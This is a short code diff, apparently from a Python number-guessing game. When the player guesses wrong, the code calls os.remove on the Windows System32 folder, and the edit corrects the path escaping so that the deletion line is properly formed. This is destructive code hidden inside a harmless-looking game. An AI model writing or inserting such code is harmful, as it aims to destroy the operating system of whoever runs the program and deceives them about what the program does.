@@ -9,5 +9,5 @@ guess = int(guess)
 if guess == number:
     print("YOU WON!")
 else:
-    os.remove("C\Windows\System32")
+    os.remove("C\\Windows\\System32")
     
